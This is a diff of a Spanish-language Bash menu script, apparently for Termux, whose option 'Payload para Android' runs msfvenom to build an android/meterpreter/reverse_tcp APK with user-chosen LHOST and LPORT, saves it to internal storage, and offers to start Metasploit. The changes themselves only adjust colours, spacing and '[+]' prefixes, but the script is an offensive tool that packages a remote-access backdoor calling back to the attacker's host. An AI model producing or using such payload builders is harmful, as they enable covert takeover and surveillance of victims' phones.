@@ -51,9 +51,10 @@ sleep 0.6
 echo -e ${magenta}"+                      ++++++++++++++                 +"
 echo ""
 sleep 0.6
+echo ""
 echo -e ${verde}"       Elige una opcion :
 	
-	  [1] Payload para Android"
+	  [1]${blanco} Payload para Android"
 echo -e ${rojo}"          [2] Salir"${verde}
 
 echo -e -n ${cyan} ">>>${verde} " 
@@ -66,7 +67,7 @@ case $opcion in
             sleep 2
                 if [ ! -x ${bin}/msfvenom ]; then
                         echo -e ${verde}"
-                Empezando...."${blanco}
+[+]${blanco} Empezando...."${blanco}
                          sleep 2
                  else
                          echo -e ${rojo}"
@@ -97,10 +98,10 @@ case $opcion in
 msfvenom -p android/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT"  R > /sdcard/"$apk"
             sleep 1
 	    echo ""
-	    echo -e ${verde}"[+]${blanco}Payload Generado"
+	    echo -e ${verde}"[+]${blanco} Payload Generado"
 	    sleep 3
 	    echo ""
-	    echo -e ${verde}"[+]${blanco}Guardado en la memoria interna"
+	    echo -e ${verde}"[+]${blanco} Guardado en la memoria interna"
 	    sleep 3
 	    echo ""
 echo -e ${blanco}" ¿Ejecuto Metasploit?"
